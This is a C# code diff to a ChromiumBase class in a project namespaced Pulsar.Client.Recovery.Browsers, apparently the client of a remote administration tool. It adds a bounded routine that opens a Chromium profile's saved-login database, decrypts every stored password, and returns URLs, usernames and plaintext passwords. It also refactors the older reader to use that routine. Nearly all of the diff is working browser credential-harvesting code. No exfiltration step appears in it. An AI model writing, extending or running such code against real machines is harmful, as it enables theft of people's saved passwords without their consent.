@@ -12,6 +12,95 @@ namespace Pulsar.Client.Recovery.Browsers
     /// </summary>
     public class ChromiumBase
     {
+        public const int MaxAccountsPerProfile = 512;
+
+        public sealed class ReadOutcome
+        {
+            public List<RecoveredAccount> Accounts { get; set; } = new List<RecoveredAccount>();
+            public PasswordRecoveryStatus Status { get; set; } = PasswordRecoveryStatus.Empty;
+            public string Detail { get; set; }
+            public bool Truncated { get; set; }
+        }
+
+        public static ReadOutcome ReadAccountsBounded(string filePath, string localStatePath, string appName)
+        {
+            var outcome = new ReadOutcome();
+            if (string.IsNullOrEmpty(appName) || appName.Equals("Local", StringComparison.OrdinalIgnoreCase))
+            {
+                outcome.Status = PasswordRecoveryStatus.Unsupported;
+                outcome.Detail = "The source is not a supported Chromium browser profile.";
+                return outcome;
+            }
+
+            if (!File.Exists(filePath))
+            {
+                outcome.Status = PasswordRecoveryStatus.Unsupported;
+                outcome.Detail = "The Chromium Login Data database was not found.";
+                return outcome;
+            }
+
+            var decryptor = new ChromiumDecryptor(localStatePath);
+            if (!decryptor.IsAvailable && decryptor.IsLocked)
+            {
+                outcome.Status = PasswordRecoveryStatus.Locked;
+                outcome.Detail = string.IsNullOrEmpty(decryptor.LastError) ? "The Chromium credential key is locked." : decryptor.LastError;
+            }
+
+            SQLiteHandler sqlDatabase;
+            try
+            {
+                sqlDatabase = new SQLiteHandler(filePath);
+            }
+            catch (Exception ex)
+            {
+                outcome.Status = PasswordRecoveryStatus.Failed;
+                outcome.Detail = ex.GetType().Name;
+                return outcome;
+            }
+
+            if (!sqlDatabase.ReadTable("logins"))
+            {
+                outcome.Status = PasswordRecoveryStatus.Unsupported;
+                outcome.Detail = "The Chromium login table is unavailable.";
+                return outcome;
+            }
+
+            int rowCount = sqlDatabase.GetRowCount();
+            int boundedCount = Math.Min(rowCount, MaxAccountsPerProfile);
+            outcome.Truncated = rowCount > boundedCount;
+
+            for (int i = 0; i < boundedCount; i++)
+            {
+                try
+                {
+                    var host = sqlDatabase.GetValue(i, "origin_url");
+                    var user = sqlDatabase.GetValue(i, "username_value");
+                    var value = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));
+
+                    if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(user) || string.IsNullOrEmpty(value))
+                        continue;
+
+                    outcome.Accounts.Add(new RecoveredAccount
+                    {
+                        Url = host,
+                        Username = user,
+                        Password = value,
+                        Application = appName
+                    });
+                }
+                catch (Exception)
+                {
+                    // Ignore malformed or locked rows; source status remains authoritative.
+                }
+            }
+
+            if (outcome.Accounts.Count > 0)
+                outcome.Status = PasswordRecoveryStatus.Supported;
+            else if (outcome.Status != PasswordRecoveryStatus.Locked)
+                outcome.Status = PasswordRecoveryStatus.Empty;
+
+            return outcome;
+        }
 
         /// <summary>
         /// Reads the stored accounts of an chromium-based application.
@@ -21,74 +110,7 @@ namespace Pulsar.Client.Recovery.Browsers
         /// <returns>A list of recovered accounts.</returns>
         public static List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath, string appName)
         {
-            var result = new List<RecoveredAccount>();
-
-            if (appName == "Local")
-            {
-                return result;
-            }
-
-            Debug.WriteLine(filePath);
-            Debug.WriteLine(localStatePath);
-            Debug.WriteLine(appName);
-
-            if (File.Exists(filePath))
-            {
-                SQLiteHandler sqlDatabase;
-
-                if (!File.Exists(filePath))
-                    return result;
-
-                var decryptor = new ChromiumDecryptor(localStatePath);
-
-                try
-                {
-                    sqlDatabase = new SQLiteHandler(filePath);
-                }
-                catch (Exception)
-                {
-                    return result;
-                }
-
-                if (!sqlDatabase.ReadTable("logins"))
-                    return result;
-
-                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
-                {
-                    try
-                    {
-
-                        var host = sqlDatabase.GetValue(i, "origin_url");
-                        //Debug.WriteLine(host);
-                        var user = sqlDatabase.GetValue(i, "username_value");
-                        //Debug.WriteLine(user);
-                        var value = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));
-                        //Debug.WriteLine(value);
-
-                        if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(user) || string.IsNullOrEmpty(value))
-                            continue;
-
-                        result.Add(new RecoveredAccount
-                        {
-                            Url = host,
-                            Username = user,
-                            Password = value,
-                            Application = appName
-                        });
-
-                    }
-                    catch (Exception e)
-                    {
-                        Debug.WriteLine(e);
-                    }
-                }
-            }
-            else
-            {
-                throw new FileNotFoundException("Can not find chromium logins file");
-            }
-
-            return result;
+            return ReadAccountsBounded(filePath, localStatePath, appName).Accounts;
         }
     }
 }
